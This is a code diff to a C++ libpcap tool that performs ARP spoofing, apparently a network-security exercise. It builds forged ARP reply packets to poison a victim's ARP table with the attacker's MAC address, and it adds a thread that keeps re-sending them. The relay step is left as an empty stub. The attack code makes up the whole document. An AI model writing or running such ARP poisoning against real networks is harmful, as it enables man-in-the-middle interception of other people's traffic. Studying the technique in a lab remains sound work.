@@ -4,7 +4,8 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt)
 {
 	struct pcap_pkthdr *header;
 	const u_char *packet;
-	while(true)
+	std::thread sendArpThread(continueSendArp, handle, pkt, 10);
+	while (true)
 	{
 		int result = pcap_next_ex(handle, &header, &packet);
 		if (result == 0)
@@ -14,11 +15,14 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt)
 			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
 			break;
 		}
-		if (/*Reinfection function*/true)
-			sendArp(handle, pkt);
+
+		// if (/*Reinfection function*/true)
+		// sendArp(handle, pkt);
 		// else
-			/*relay function*/
+		/*relay function*/
 	}
+
+	sendArpThread.detach();
 }
 
 int main(int argc, char *argv[])
@@ -31,18 +35,18 @@ int main(int argc, char *argv[])
 	}
 	// for multiple execution
 	int iter;
-	for (iter = 2; iter <= argc-1; iter += 2)
+	for (iter = 2; iter <= argc - 1; iter += 2)
 	{
 		printf("\n----------------------------------------\n");
-		printf("[*] send-arp #%d..",iter/2);
+		printf("[*] arp-spoof #%d..", iter / 2);
 		printf("\n----------------------------------------\n");
 
 		char *dev = argv[1];
 		const char *interfaceName = argv[1];
-		
+
 		Ip attackerIp;
 		Mac attackerMac;
-		
+
 		getHostInfo(interfaceName, &attackerIp, &attackerMac);
 
 		// Open pcap handle
@@ -66,24 +70,19 @@ int main(int argc, char *argv[])
 		printf("[*] get target Info..");
 		printf("\n----------------------------------------\n");
 
-		Ip targetIp = Ip(argv[iter+1]);
+		Ip targetIp = Ip(argv[iter + 1]);
 		Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
 		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
 		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
-		
 
 		// Send ARP Reply packet to infect sender's ARP table
 		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp);
 		sendArp(handle, pkt);
 
-		std::thread sendArpThread(continueSendArp, handle, 10);
-
 		while (true)
 		{
 			spoofProcess(ArpHdr::Reply, handle, pkt);
 		}
-		sendArpThread.detach();
-
 
 		pcap_close(handle);
 	}
